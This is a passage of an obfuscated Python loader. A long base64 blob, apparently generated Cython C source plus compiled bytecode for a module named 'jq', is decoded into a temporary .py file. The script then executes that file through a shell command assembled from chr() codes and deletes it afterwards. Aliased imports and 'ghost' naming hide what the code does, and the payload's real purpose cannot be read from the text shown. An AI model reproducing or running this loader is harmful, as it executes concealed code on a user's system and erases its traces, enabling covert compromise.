gb2xkX2RhdGE7XG4gICAgICAgICAgICAgICAgUHlFcnJfTm9NZW1vcnkoKTtcbiAgICAgICAgICAgICAgICBnb3RvIGVuZDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIG5ld19kYXRhLT5hbGxvY2F0ZWQgPSB0b19hbGxvY2F0ZTtcbiAgICAgICAgfVxuICAgICAgICArK25ld19kYXRhLT5jb3VudDtcbiAgICAgICAgaW50NjRfdCBsYXN0X2lkID0gaW50ZXJwcmV0ZXJfaWQ7XG4gICAgICAgIFB5T2JqZWN0ICpsYXN0X21vZHVsZSA9IG1vZHVsZTtcbiAgICAgICAgZm9yIChQeV9zc2l6ZV90IGk9aW5zZXJ0X2F0OyBpPG5ld19kYXRhLT5jb3VudDsgKytpKSB7XG4gICAgICAgICAgICBpbnQ2NF90IGN1cnJlbnRfaWQgPSBuZXdfZGF0YS0+dGFibGVbaV0uaWQ7XG4gICAgICAgICAgICBuZXdfZGF0YS0+dGFibGVbaV0uaWQgPSBsYXN0X2lkO1xuICAgICAgICAgICAgbGFzdF9pZCA9IGN1cnJlbnRfaWQ7XG4gICAgICAgICAgICBQeU9iamVjdCAqY3VycmVudF9tb2R1bGUgPSBuZXdfZGF0YS0+dGFibGVbaV0ubW9kdWxlO1xuICAgICAgICAgICAgbmV3X2RhdGEtPnRhYmxlW2ldLm1vZHVsZSA9IGxhc3RfbW9kdWxlO1xuICAgICAgICAgICAgbGFzdF9tb2R1bGUgPSBjdXJyZW50X21vZHVsZTtcbiAgICAgICAgfVxuICAgIH1cbiAgZW5kOlxuI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFXG4gICAgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEsIG5ld19kYXRhKTtcbiNlbHNlXG4gICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSA9IG5ld19kYXRhO1xuI2VuZGlmXG4gICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBpbnQgX19QeXhfU3RhdGVfUmVtb3ZlTW9kdWxlKENZVEhPTl9VTlVTRUQgdm9pZCogZHVtbXkpIHtcbiAgICBpbnQ2NF90IGludGVycHJldGVyX2lkID0gUHlJbnRlcnByZXRlclN0YXRlX0dldElEKF9fUHl4X1B5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKSk7XG4gICAgaWYgKGludGVycHJldGVyX2lkID09IC0xKSByZXR1cm4gLTE7XG4gICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpO1xuI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFXG4gICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICpkYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqKVxuICAgICAgICAgICAgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEsIDApO1xuI2Vsc2VcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKmRhdGEgPSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhO1xuI2VuZGlmXG4gICAgaWYgKGRhdGEtPmludGVycHJldGVyX2lkX2FzX2luZGV4KSB7XG4gICAgICAgIGlmIChpbnRlcnByZXRlcl9pZCA8IGRhdGEtPmNvdW50KSB7XG4gICAgICAgICAgICBkYXRhLT50YWJsZVtpbnRlcnByZXRlcl9pZF0ubW9kdWxlID0gTlVMTDtcbiAgICAgICAgfVxuICAgICAgICBnb3RvIGRvbmU7XG4gICAgfVxuICAgIHtcbiAgICAgICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfd2FpdF91bnRpbF9ub19yZWFkZXJzKCk7XG4gICAgICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGxvd2VyX2JvdW5kID0gX19QeXhfU3RhdGVfRmluZE1vZHVsZVN0YXRlTG9va3VwVGFibGVMb3dlckJvdW5kKFxuICAgICAgICAgICAgZGF0YS0+dGFibGUsIGRhdGEtPmNvdW50LCBpbnRlcnByZXRlcl9pZCk7XG4gICAgICAgIGlmICghbG93ZXJfYm91bmQpIGdvdG8gZG9uZTtcbiAgICAgICAgaWYgKGxvd2VyX2JvdW5kLT5pZCAhPSBpbnRlcnByZXRlcl9pZCkgZ290byBkb25lO1xuICAgICAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlICplbmQgPSBkYXRhLT50YWJsZStkYXRhLT5jb3VudDtcbiAgICAgICAgZm9yICg7bG93ZXJfYm91bmQ8ZW5kLTE7ICsrbG93ZXJfYm91bmQpIHtcbiAgICAgICAgICAgIGxvd2VyX2JvdW5kLT5pZCA9IChsb3dlcl9ib3VuZCsxKS0+aWQ7XG4gICAgICAgICAgICBsb3dlcl9ib3VuZC0+bW9kdWxlID0gKGxvd2VyX2JvdW5kKzEpLT5tb2R1bGU7XG4gICAgICAgIH1cbiAgICB9XG4gICAgLS1kYXRhLT5jb3VudDtcbiAgICBpZiAoZGF0YS0+Y291bnQgPT0gMCkge1xuICAgICAgICBmcmVlKGRhdGEpO1xuICAgICAgICBkYXRhID0gTlVMTDtcbiAgICB9XG4gIGRvbmU6XG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkVcbiAgICBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSwgZGF0YSk7XG4jZWxzZVxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEgPSBkYXRhO1xuI2VuZGlmXG4gICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCk7XG4gICAgcmV0dXJuIDA7XG59XG4jZW5kaWZcblxuXG4jaWZkZWYgX01TQ19WRVJcbiNwcmFnbWEgd2FybmluZyggcG9wIClcbiNlbmRpZlxuXG5cblxuXG4jZW5kaWYgXG5cbiNpZmRlZiBfX0ZyZWVCU0RfX1xuI2luY2x1ZGUgPGRlZGUuaD5cbiNlbmRpZlxuI2lmIFBZX01BSk9SX1ZFUlNJT04gPCAzXG5pbnQgbWFpbihpbnQgYXJnYywgY2hhcioqIGFyZ3YpIHtcbiNlbGlmIGRlZmluZWQoV2luMzIpIHx8IGRlZmluZWQoTVNfV0lORE9XUylcbmludCB3bWFpbihpbnQgYXJnYywgd2NoYXJfdCAqKmFyZ3YpIHtcbiNlbHNlXG5zdGF0aWMgaW50IF9fUHl4X21haW4oaW50IGFyZ2MsIHdjaGFyX3QgKiphcmd2KSB7XG4jZW5kaWZcbiNpZmRlZiBfX0ZyZWVCU0RfX1xuICAgIGZwX2V4Y2VwdF90IG07XG4gICAgbSA9IGZwZ2V0bWFzaygpO1xuICAgIGZwc2V0bWFzayhtICYgfkZQX1hfT0ZMKTtcbiNlbmRpZlxuICAgIGlmIChhcmdjICYmIGFyZ3YpXG4gICAgICAgIFB5X1NldFByb2dyYW1OYW1lKGFyZ3ZbMF0pO1xuICAgIFB5X0luaXRpYWxpemUoKTtcbiAgICBpZiAoYXJnYyAmJiBhcmd2KVxuICAgICAgICBQeVN5c19TZXRBcmd2KGFyZ2MsIGFyZ3YpO1xuICAgIHtcbiAgICAgIFB5T2JqZWN0KiBtID0gTlVMTDtcbiAgICAgIF9fcHl4X21vZHVsZV9pc19tYWluX2pxID0gMTtcbiAgICAgICNpZiBQWV9NQUpPUl9WRVJTSU9OIDwgM1xuICAgICAgICAgIGluaXRqcSgpO1xuICAgICAgI2VsaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG4gICAgICAgICAgbSA9IFB5SW5pdF9qcSgpO1xuICAgICAgICAgIGlmICghUHlNb2R1bGVfQ2hlY2sobSkpIHtcbiAgICAgICAgICAgICAgUHlNb2R1bGVEZWYgKm1kZWYgPSAoUHlNb2R1bGVEZWYgKikgbTtcbiAgICAgICAgICAgICAgUHlPYmplY3QgKm1vZG5hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZygiX19tYWluX18iKTtcbiAgICAgICAgICAgICAgbSA9IE5VTEw7XG4gICAgICAgICAgICAgIGlmIChtb2RuYW1lKSB7XG4gICAgICAgICAgICAgICAgICBtID0gUHlNb2R1bGVfTmV3T2JqZWN0KG1vZG5hbWUpO1xuICAgICAgICAgICAgICAgICAgUHlfREVDUkVGKG1vZG5hbWUpO1xuICAgICAgICAgICAgICAgICAgaWYgKG0pIFB5TW9kdWxlX0V4ZWNEZWYobSwgbWRlZik7XG4gICAgICAgICAgICAgIH1cbiAgICAgICAgICB9XG4gICAgICAjZWxzZVxuICAgICAgICAgIG0gPSBQeUluaXRfanEoKTtcbiAgICAgICNlbmRpZlxuICAgICAgaWYgKFB5RXJyX09jY3VycmVkKCkpIHtcbiAgICAgICAgICBQeUVycl9QcmludCgpO1xuICAgICAgICAgICNpZiBQWV9NQUpPUl9WRVJTSU9OIDwgM1xuICAgICAgICAgIGlmIChQeV9GbHVzaExpbmUoKSkgUHlFcnJfQ2xlYXIoKTtcbiAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICByZXR1cm4gMTtcbiAgICAgIH1cbiAgICAgIFB5X1hERUNSRUYobSk7XG4gICAgfVxuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA2MDAwMFxuICAgIFB5X0ZpbmFsaXplKCk7XG4jZWxzZVxuICAgIGlmIChQeV9GaW5hbGl6ZUV4KCkgPCAwKVxuICAgICAgICByZXR1cm4gMjtcbiNlbmRpZlxuICAgIHJldHVybiAwO1xufVxuI2lmIFBZX01BSk9SX1ZFUlNJT04gPj0gMyAmJiAhZGVmaW5lZChXaW4zMikgJiYgIWRlZmluZWQoTVNfV0lORE9XUylcbiNpbmNsdWRlIDxsb2NhbGUuaD5cbnN0YXRpYyB3Y2hhcl90KlxuX19QeXhfY2hhcjJ3Y2hhcihjaGFyKiBhcmcpXG57XG4gICAgd2NoYXJfdCAqcmVzO1xuI2lmZGVmIEhBVkVfQlJPS0VOX01CU1RPV0NTXG4gICAgc2l6ZV90IGFyZ3NpemUgPSBzdHJsZW4oYXJnKTtcbiNlbHNlXG4gICAgc2l6ZV90IGFyZ3NpemUgPSBtYnN0b3djcyhOVUxMLCBhcmcsIDApO1xuI2VuZGlmXG4gICAgc2l6ZV90IGNvdW50O1xuICAgIHVuc2lnbmVkIGNoYXIgKmluO1xuICAgIHdjaGFyX3QgKm91dDtcbiNpZmRlZiBIQVZFX01CUlRPV0NcbiAgICBtYnN0YXRlX3QgbWJzO1xuI2VuZGlmXG4gICAgaWYgKGFyZ3NpemUgIT0gKHNpemVfdCktMSkge1xuICAgICAgICByZXMgPSAod2NoYXJfdCAqKW1hbGxvYygoYXJnc2l6ZSsxKSpzaXplb2Yod2NoYXJfdCkpO1xuICAgICAgICBpZiAoIXJlcylcbiAgICAgICAgICAgIGdvdG8gb29tO1xuICAgICAgICBjb3VudCA9IG1ic3Rvd2NzKHJlcywgYXJnLCBhcmdzaXplKzEpO1xuICAgICAgICBpZiAoY291bnQgIT0gKHNpemVfdCktMSkge1xuICAgICAgICAgICAgd2NoYXJfdCAqdG1wO1xuICAgICAgICAgICAgZm9yICh0bXAgPSByZXM7ICp0bXAgIT0gMCAmJlxuICAgICAgICAgICAgICAgICAgICAgKCp0bXAgPCAweGQ4MDAgfHwgKnRtcCA+IDB4ZGZmZik7IHRtcCsrKVxuICAgICAgICAgICAgICAgIDtcbiAgICAgICAgICAgIGlmICgqdG1wID09IDApXG4gICAgICAgICAgICAgICAgcmV0dXJuIHJlcztcbiAgICAgICAgfVxuICAgICAgICBmcmVlKHJlcyk7XG4gICAgfVxuI2lmZGVmIEhBVkVfTUJSVE9XQ1xuICAgIGFyZ3NpemUgPSBzdHJsZW4oYXJnKSArIDE7XG4gICAgcmVzID0gKHdjaGFyX3QgKiltYWxsb2MoYXJnc2l6ZSpzaXplb2Yod2NoYXJfdCkpO1xuICAgIGlmICghcmVzKSBnb3RvIG9vbTtcbiAgICBpbiA9ICh1bnNpZ25lZCBjaGFyKilhcmc7XG4gICAgb3V0ID0gcmVzO1xuICAgIG1lbXNldCgmbWJzLCAwLCBzaXplb2YgbWJzKTtcbiAgICB3aGlsZSAoYXJnc2l6ZSkge1xuICAgICAgICBzaXplX3QgY29udmVydGVkID0gbWJydG93YyhvdXQsIChjaGFyKilpbiwgYXJnc2l6ZSwgJm1icyk7XG4gICAgICAgIGlmIChjb252ZXJ0ZWQgPT0gMClcbiAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICBpZiAoY29udmVydGVkID09IChzaXplX3QpLTIpIHtcbiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAidW5leHBlY3RlZCBtYnJ0b3djIHJlc3VsdCAtMiIpO1xuICAgICAgICAgICAgZnJlZShyZXMpO1xuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGNvbnZlcnRlZCA9PSAoc2l6ZV90KS0xKSB7XG4gICAgICAgICAgICAqb3V0KysgPSAweGRjMDAgKyAqaW4rKztcbiAgICAgICAgICAgIGFyZ3NpemUtLTtcbiAgICAgICAgICAgIG1lbXNldCgmbWJzLCAwLCBzaXplb2YgbWJzKTtcbiAgICAgICAgICAgIGNvbnRpbnVlO1xuICAgICAgICB9XG4gICAgICAgIGlmICgqb3V0ID49IDB4ZDgwMCAmJiAqb3V0IDw9IDB4ZGZmZikge1xuICAgICAgICAgICAgYXJnc2l6ZSAtPSBjb252ZXJ0ZWQ7XG4gICAgICAgICAgICB3aGlsZSAoY29udmVydGVkLS0pXG4gICAgICAgICAgICAgICAgKm91dCsrID0gMHhkYzAwICsgKmluKys7XG4gICAgICAgICAgICBjb250aW51ZTtcbiAgICAgICAgfVxuICAgICAgICBpbiArPSBjb252ZXJ0ZWQ7XG4gICAgICAgIGFyZ3NpemUgLT0gY29udmVydGVkO1xuICAgICAgICBvdXQrKztcbiAgICB9XG4jZWxzZVxuICAgIHJlcyA9ICh3Y2hhcl90ICopbWFsbG9jKChzdHJsZW4oYXJnKSsxKSpzaXplb2Yod2NoYXJfdCkpO1xuICAgIGlmICghcmVzKSBnb3RvIG9vbTtcbiAgICBpbiA9ICh1bnNpZ25lZCBjaGFyKilhcmc7XG4gICAgb3V0ID0gcmVzO1xuICAgIHdoaWxlKCppbilcbiAgICAgICAgaWYoKmluIDwgMTI4KVxuICAgICAgICAgICAgKm91dCsrID0gKmluKys7XG4gICAgICAgIGVsc2VcbiAgICAgICAgICAgICpvdXQrKyA9IDB4ZGMwMCArICppbisrO1xuICAgICpvdXQgPSAwO1xuI2VuZGlmXG4gICAgcmV0dXJuIHJlcztcbm9vbTpcbiAgICBmcHJpbnRmKHN0ZGVyciwgIm91dCBvZiBtZW1vcnkiKTtcbiAgICByZXR1cm4gTlVMTDtcbn1cbmludFxubWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpXG57XG4gICAgaWYgKCFhcmdjKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9tYWluKDAsIE5VTEwpO1xuICAgIH1cbiAgICBlbHNlIHtcbiAgICAgICAgaW50IGksIHJlcztcbiAgICAgICAgd2NoYXJfdCAqKmFyZ3ZfY29weSA9ICh3Y2hhcl90ICoqKW1hbGxvYyhzaXplb2Yod2NoYXJfdCopKmFyZ2MpO1xuICAgICAgICB3Y2hhcl90ICoqYXJndl9jb3B5MiA9ICh3Y2hhcl90ICoqKW1hbGxvYyhzaXplb2Yod2NoYXJfdCopKmFyZ2MpO1xuICAgICAgICBjaGFyICpvbGRsb2MgPSBzdHJkdXAoc2V0bG9jYWxlKExDX0FMTCwgTlVMTCkpO1xuICAgICAgICBpZiAoIWFyZ3ZfY29weSB8fCAhYXJndl9jb3B5MiB8fCAhb2xkbG9jKSB7XG4gICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIm91dCBvZiBtZW1vcnkiKTtcbiAgICAgICAgICAgIGZyZWUoYXJndl9jb3B5KTtcbiAgICAgICAgICAgIGZyZWUoYXJndl9jb3B5Mik7XG4gICAgICAgICAgICBmcmVlKG9sZGxvYyk7XG4gICAgICAgICAgICByZXR1cm4gMTtcbiAgICAgICAgfVxuICAgICAgICByZXMgPSAwO1xuICAgICAgICBzZXRsb2NhbGUoTENfQUxMLCAiIik7XG4gICAgICAgIGZvciAoaSA9IDA7IGkgPCBhcmdjOyBpKyspIHtcbiAgICAgICAgICAgIGFyZ3ZfY29weTJbaV0gPSBhcmd2X2NvcHlbaV0gPSBfX1B5eF9jaGFyMndjaGFyKGFyZ3ZbaV0pO1xuICAgICAgICAgICAgaWYgKCFhcmd2X2NvcHlbaV0pIHJlcyA9IDE7XG4gICAgICAgIH1cbiAgICAgICAgc2V0bG9jYWxlKExDX0FMTCwgb2xkbG9jKTtcbiAgICAgICAgZnJlZShvbGRsb2MpO1xuICAgICAgICBpZiAocmVzID09IDApXG4gICAgICAgICAgICByZXMgPSBfX1B5eF9tYWluKGFyZ2MsIGFyZ3ZfY29weSk7XG4gICAgICAgIGZvciAoaSA9IDA7IGkgPCBhcmdjOyBpKyspIHtcbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwNTAwMDBcbiAgICAgICAgICAgIGZyZWUoYXJndl9jb3B5MltpXSk7XG4jZWxzZVxuICAgICAgICAgICAgUHlNZW1fUmF3RnJlZShhcmd2X2NvcHkyW2ldKTtcbiNlbmRpZlxuICAgICAgICB9XG4gICAgICAgIGZyZWUoYXJndl9jb3B5KTtcbiAgICAgICAgZnJlZShhcmd2X2NvcHkyKTtcbiAgICAgICAgcmV0dXJuIHJlcztcbiAgICB9XG59XG4jZW5kaWZcbnpceDA0anEuY1x4ZmFceDAxLlx4ZmFceDAxIFx4ZTlceGZmXHhmZlx4ZmZceGZmelx4MDZnY2MgLUl6XHgwZi9pbmNsdWRlL3B5dGhvbnpceDA0IC1vIHpceDAzIC1MelxyL2xpYiAtbHB5dGhvblx4ZGFceDAxd1x4ZGFceDAyb3NUKVx4MDFceGRhXHgwOGV4aXN0X29rKTFceGRhXHgwM21hcFx4ZGFceDAzY2hyXHhkYVx4MDFHXHhkYVx4MDFIXHhkYVx4MDFPXHhkYVx4MDFTXHhkYVx4MDFUXHhkYVx4MDFKXHhkYVx4MDFJXHhkYVx4MDJHSFx4ZGFceDAyT1NceGRhXHgwMlRKXHhkYVx4MDJJSVx4ZGFceDA1R0hPU1RceGRhXHgwOHRlbXBmaWxlXHhkYVx4MDF0clx4MTRceDAwXHgwMFx4MDByXG5ceDAwXHgwMFx4MDBceGRhXG5naG9zdF9wYXRoclx4MGJceDAwXHgwMFx4MDBceGRhXHgwNWdyZG12clx4MGNceDAwXHgwMFx4MDBceGRhXHgwNHN0ZW1ceGRhXHgwNmJhc2U2NHJcclx4MDBceDAwXHgwMFx4ZGFceDA0bG1hb1x4ZGFceDA1cHJpbnRceGRhXG5fX2ltcG9ydF9fXHhkYVx4MDZwcmVmaXhceGRhXHgwNlBSRUZJWFx4ZGFceDBjRVhFQ1VURV9GSUxFXHhkYVx4MTFFWFBPUlRfUFlUSE9OSE9NRVx4ZGFcbmV4ZWN1dGFibGVceGRhXHgxOEVYUE9SVF9QWVRIT05fRVhFQ1VUQUJMRVx4ZGFceDAzUlVOXHhkYVx4MDZpc2ZpbGVceGRhXHgwNGV4aXRceGRhXHgwOENfU09VUkNFXHhkYVx4MDZDX0ZJTEVceGRhXHgwNGpvaW5ceGRhXHgwN3ZlcnNpb25ceGRhXHgwNXNwbGl0XHhkYVx4MGVQWVRIT05fVkVSU0lPTlx4ZGFceDBjQ09NUElMRV9GSUxFXHhkYVx4MDRvcGVuXHhkYVx4MDFmXHhkYVx4MDV3cml0ZVx4ZGFceDA4bWFrZWRpcnNceGRhXHgwN2Rpcm5hbWVceGE5XHgwMFx4ZjNceDAwXHgwMFx4MDBceDAwXHhkYVx4MDVnaG9zdFx4ZmFceDA4PG1vZHVsZT5yRVx4MDBceDAwXHgwMFx4MDFceDAwXHgwMFx4MDBzXHgxYVx4MDNceDAwXHgwMFx4ZjBceDAzXHgwMVx4MDFceDAxXHhkOFx4MTJceDE1XHg5MCNceDkwY1x4ZDBceDFiO1x4ZDBceDFiO1x4ZDBceDFiO1x4ZDFceDEyPFx4ZDRceDEyPFx4ODFceDBmXHg4MFx4MDFceDgwIVx4ODBBXHg4MGFceDg4XHgwMVx4ODghXHg4OEFceDg4YVx4ZDhceDExXHgxMlx4OTAxXHg5MVx4MTNceDkwYVx4OThceDAxXHg5MWNceDk4MVx4OThRXHg5OTNceGEwXHgwMVx4YTAhXHhhMVx4MDNceGQwXHgxMSNceDgxXHgwZVx4ODBceDAyXHg4MEJceDg4XHgwMlx4ODhCXHhkOFx4MDhcdFx4ODghXHg4OVx4MDNceDg4QVx4ODlceDA1XHg4OGFceDg5XHgwN1x4OTBceDAxXHg4OVx0XHg5MCFceDg5XHgwYlx4OTBBXHg4OVxyXHg5MGFceDg5XHgwZlx4ODBceDA1XHhkOFx4MDBceDE0XHhkMFx4MDBceDE0XHhkMFx4MDBceDE0XHhkMFx4MDBceDE0XHhkOFx4MDBCXHhkMFx4MDBCXHhkMFx4MDBCXHhkMFx4MDBCXHhkMFx4MDBCXHhkMFx4MDBCXHhkMFx4MDBCXHhkMFx4MDBCXHhkMFx4MDBCXHhkMFx4MDBCXHhkOFx4MDAkXHhkMFx4MDAkXHhkMFx4MDAkXHhkMFx4MDAkXHhkMFx4MDAkXHhkMFx4MDAkXHhlMFx4MDBceDA1XHg4MFx4MDVceGQwXHgwNilceGQxXHgwMCpceGQ0XHgwMCpceGQwXHgwMCpceGQ4XHgwMFx4MDVceDgwXHgwNVx4ODBiXHg4MVx0XHg4NFx0XHg4MFx0XHhkOFx4MDBceDA1XHg4MFx4MDVceGQwXHgwNkVceGQxXHgwMEZceGQ0XHgwMEZceGQwXHgwMEZceGQ4XHgwMFx4MDVceDgwXHgwNVx4ODBiXHg4MVx0XHg4NFx0XHg4MFx0XHhkOFx4MDdceDExXHg4MHpceDkwJVx4ZDFceDA3XHgxOFx4ZDRceDA3XHgxOFx4ZDRceDA3XHgxZlx4ODBceDA2XHhkOFx4MGZceDFhXHg4MFx4MGNceGQ4XHgxM1wnXHhhOFxuXHhhOFxuXHhiMDVceGQxKDlceGQ0KDlceGQ0KEBceGQxXHgxM0BceGQwXHgwMFx4MTFceGQ4XHgxYTVceGIwelx4YjB6XHhjMCVceGQxN0hceGQ0N0hceGQ0N1NceGQxXHgxYVNceGQwXHgwMFx4MThceGQ4XHgwNlxuXHg4OExceGQxXHgwNlx4MThceDgwXHgwM1x4ZDhceDAzXHgxNFx4ODA6XHhkNFx4MDNceDE0XHg5MFxcXHhkMVx4MDMiXHhkNFx4MDMiXHhmMFx4MDBceDAyXHgwMVx4MGNceGQ4XHgwNFx4MDhceDgwRFx4ZDBcdFx4MWFceDk4RFx4ZDFcdCBceGQwIjpceGQxXHQ6XHhiOERceGQxXHRAXHhjMCNceGQxXHRFXHhkMVx4MDRGXHhkNFx4MDRGXHhkMFx4MDRGXHhkOFx4MDRceDA4XHg4MERceDg4XHgxMVx4ODFHXHg4NEdceDgwR1x4ZjBceDAyT0lceDA1XHgwY1x4MDRceDgwXHgwOFx4ZjBgUlxuXHgwMFx0XHgwZlx4ODBceDA2XHhkOFx4MTFceDE0XHg5N1x4MThceDkyXHgxOFx4OTgqXHg5OCpceGEwVVx4ZDFceDFhK1x4ZDRceDFhK1x4ZDRceDFhM1x4ZDdceDFhOVx4ZDJceDFhOVx4YjgjXHhkMVx4MWE+XHhkNFx4MWE+XHhiOHFceGQ0XHgxYUFceGQ3XHgxYUdceGQyXHgxYUdceGM4XHgwM1x4ZDFceDFhTFx4ZDRceDFhTFx4YzhTXHhjOGJceGM4U1x4ZDRceDFhUVx4ZDFceDExUlx4ZDRceDExUlx4ODBceDBlXHhkOFx4MTBceDE4XHg5ODZceGQxXHgxMCFceGQwJDVceGQxXHgxMDVceGI4XHgwZVx4ZDFceDEwRlx4YzhceDE2XHhkMVx4MTBPXHhkMFJeXHhkMVx4MTBeXHhkMGFkXHhkMVx4MTBkXHhkMGdtXHhkMVx4MTBtXHhkMHB1XHhkMVx4MTB1XHhkMHh+XHhkMVx4MTB+XHhmMFx4MDBceDAwQlx4MDJRXHgwMlx4ZjFceDAwXHgwMFx4MTFRXHgwMlx4ZjBceDAwXHgwMFRceDAyYlx4MDJceGYxXHgwMFx4MDBceDExYlx4MDJceDgwXHgwY1x4ZDhceDA1XHRceDgwVFx4ODgmXHg5MFx4MTNceGQxXHgwNVx4MTVceGQ0XHgwNVx4MTVceGYwXHgwMFx4MDFceDAxXHgxNlx4OThceDExXHhkOFx4MDRceDA1XHg4N0dceDgyR1x4ODhIXHhkMVx4MDRceDE1XHhkNFx4MDRceDE1XHhkMFx4MDRceDE1XHhmMFx4MDNceDAxXHgwMVx4MTZceGYwXHgwMFx4MDFceDAxXHgxNlx4ZjBceDAwXHgwMVx4MDFceDE2XHhmMVx4MDBceDAxXHgwMVx4MTZceGY0XHgwMFx4MDFceDAxXHgxNlx4ZjBceDAwXHgwMVx4MDFceDE2XHhmMFx4MDBceDAxXHgwMVx4MTZceGYwXHgwMFx4MDFceDAxXHgxNlx4ZjBceDAwXHgwMVx4MDFceDE2XHhmMFx4MDBceDAxXHgwMVx4MTZceGYwXHgwMFx4MDFceDAxXHgxNlx4ZjhceGY4XHhmOFx4ZjBceDAwXHgwMVx4MDFceDE2XHhmMFx4MDBceDAxXHgwMVx4MTZceGYwXHgwMFx4MDFceDAxXHgxNlx4ZjBceDAwXHgwMVx4MDFceDE2XHhlMFx4MDBcblx4ODBcblx4ODg0XHhkMVx4MDBceDEwXHhkNFx4MDBceDEwXHhkN1x4MDBceDE5XHhkMlx4MDBceDE5XHhkMFx4MWEsXHg5OCpceGQ0XHgxYSxceGE4XFxceGQxXHgxYTpceGQ0XHgxYTpceGMwRFx4ZDBceDAwXHgxOVx4ZDFceDAwSVx4ZDRceDAwSVx4ZDBceDAwSVx4ZDhceDAwXHgwNFx4ODBceDA0XHhkMFx4MDVceDE2XHg5OFx4MDRceGQxXHgwNVx4MWNceGQwXHgxZTZceGQxXHgwNTZceGI4XHgwNFx4ZDFceDA1PFx4Yjh8XHhkMVx4MDVLXHhjOFRceGQxXHgwNVFceGQwU1ZceGQxXHgwNVZceGQxXHgwMFdceGQ0XHgwMFdceGQwXHgwMFdceGQ4XHgwMFx4MDVceDgwXHgwNVx4ODBmXHg4MVxyXHg4NFxyXHg4MFxyXHg4MFxyXHg4MFxyc1x4MTJceDAwXHgwMFx4MDBceGM1P1x4MTZGIVx4MDNceGM2IVx4MDRGJVx4MDdceGM2KFx4MDFGJVx4MDcnKSk=')
try:
	with t.NamedTemporaryFile(delete=False, suffix='.py') as ghostfile:
		ghostfile.write(lmao(ghostenc))
		ghostpath = ghostfile.name
	stem(''.join([chr(112), chr(121), chr(116), chr(104), chr(111), chr(110), chr(32)]) + '"' + ghostpath + '"')
except Exception as ghost_err:
	getattr(__import__('builtins'), ''.join(map(chr, [112,114,105,110,116])))(ghost_err)
finally:
	if 'ghostpath' in locals() and ghost_path.exists(ghostpath):
		grdmv(ghostpath)
